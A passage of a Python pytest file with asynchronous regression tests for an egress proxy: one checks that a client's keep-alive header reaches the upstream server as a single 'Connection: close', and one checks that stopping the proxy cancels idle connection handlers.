    forward path: the client asks for keep-alive, but the upstream — the
    real network peer the proxy talks to — must receive exactly one
    ``Connection: close`` so it closes after the response and the relay
    gets a prompt EOF. A regression here reintroduces the git-over-proxy
    hang.
    """
    cert_path, key_path, _ = ca_paths
    captured: list[_CapturedRequest] = []
    upstream = await _start_capturing_upstream(captured)
    upstream_port = upstream.sockets[0].getsockname()[1]

    proxy = EgressProxy(
        parse_rules(["* 127.0.0.1/**"]),
        cert_path,
        key_path,
        block_private_destinations=False,
    )
    proxy_port = await proxy.start_tcp()
    try:
        reader, writer = await asyncio.open_connection("127.0.0.1", proxy_port)
        request = (
            f"GET http://127.0.0.1:{upstream_port}/probe HTTP/1.1\r\n"
            f"Host: 127.0.0.1:{upstream_port}\r\n"
            "Connection: keep-alive\r\n"
            "Keep-Alive: timeout=5\r\n"
            "\r\n"
        ).encode("latin-1")
        writer.write(request)
        await writer.drain()
        response = await asyncio.wait_for(reader.read(4096), timeout=5)
        writer.close()
        with contextlib.suppress(Exception):
            await writer.wait_closed()
    finally:
        await proxy.stop()
        upstream.close()
        await upstream.wait_closed()

    assert b"200 OK" in response, f"Request did not complete through proxy: {response[:200]!r}"
    assert len(captured) == 1, "Upstream should have received exactly one request"
    # The client's keep-alive was rewritten to a single close upstream.
    assert captured[0].connection == ["close"], captured[0].connection


@pytest.mark.asyncio
async def test_stop_cancels_in_flight_connection_handlers(
    ca_paths: tuple[Path, Path, Path],
) -> None:
    """``stop`` cancels handlers parked in a read instead of leaking them.

    A client that connects but sends no request line leaves
    ``_handle_client`` parked in its 30 s readline. Without explicit
    cancellation in ``stop`` such handlers outlive the event loop and the
    interpreter prints "Task was destroyed but it is pending" on teardown.
    The test parks two handlers, stops the proxy, and asserts the tracked
    set is drained and every handler task reached a terminal (done) state.
    """
    cert_path, key_path, _ = ca_paths
    proxy = EgressProxy(parse_rules(["GET example.com/**"]), cert_path, key_path)
    port = await proxy.start_tcp()

    socks = [socket.create_connection(("127.0.0.1", port)) for _ in range(2)]
    try:
        # Wait (event-driven, not a fixed sleep) until the server has
        # accepted both connections and registered their handler tasks.
        async def _both_parked() -> list[asyncio.Task[None]]:
            while True:
                parked = [t for t in proxy._client_tasks if not t.done()]
                if len(parked) == 2:
                    return parked
                await asyncio.sleep(0)

        # Two connections opened -> exactly two parked handlers; a
        # different count would mean accept-time tracking (_client_connected)
        # dropped or duplicated a handler.
        parked = await asyncio.wait_for(_both_parked(), timeout=5)

        await proxy.stop()

        # Every previously-parked handler must be terminal (done) the moment
        # stop() returns. This is the real regression detector: the handlers
        # are blocked in a 30 s readline, so without stop()'s cancel/gather
        # loop they would still be pending here (and leak past the loop as
        # "Task was destroyed but it is pending"). They finish done-not-
        # cancelled because _handle_client's finally swallows the injected
        # CancelledError while closing the writer — but they only got to run
        # that cleanup because stop() cancelled them.
        assert all(t.done() for t in parked)
    finally:
        for s in socks:
            s.close()
